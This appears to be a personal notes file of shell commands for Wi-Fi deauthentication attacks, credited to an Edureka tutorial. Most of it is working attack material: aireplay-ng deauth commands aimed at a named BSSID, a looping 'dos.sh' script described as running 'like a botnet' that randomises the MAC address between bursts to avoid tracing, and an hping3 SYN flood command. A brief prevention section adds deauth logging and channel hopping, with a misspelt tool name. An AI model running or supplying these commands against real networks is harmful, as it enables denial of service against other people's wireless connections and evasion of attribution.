# Edureka's Method using aireplay-ng

su root
ifconfig wlo1 down
iwconfig wlo1 mode monitor
ifconfig wlo1 up

iwconfig

airmon-ng check kill
kill PID
airmon-ng check kill

airodump-ng wlo1        # Copy bssid, ch
iwconfig wlo1 channel 6
aireplay-ng -0 0 -a 38:17:C3:C0:D2:40 wlo1



# Script to run like a botnet
## dos.sh
while true
do
    aireplay-ng -0 10 -a 38:17:C3:C0:D2:40 wlo1
    ifconfig wlo1 down
    macchanger -r wlo1 | grep "New MAC"
    ifconfig wlo1 up
    sleep 5

done


# Prevention
## Detect Deauth Packets

airdump-ng --write /tmp/deauth.log --output-format csv wlo10mon


## Method 2 (script)
#!/bin/bash

# Set your wireless interface name
IFACE="wlo1"

# Define allowed channels (2.4GHz common channels: 1 to 11)
CHANNELS=(1 2 3 4 5 6 7 8 9 10 11)

# Randomly select one channel
RANDOM_CHANNEL=${CHANNELS[$RANDOM % ${#CHANNELS[@]}]}

echo "[*] Changing $IFACE to channel $RANDOM_CHANNEL"

# Change channel using iw (needs interface in monitor or AP mode)
iw dev $IFACE set channel $RANDOM_CHANNEL

# Optional: restart hostapd or your AP service if required
systemctl restart hostapd


# Using Hping3
sudo hping3 -S --flood -p 8080 127.0.0.1


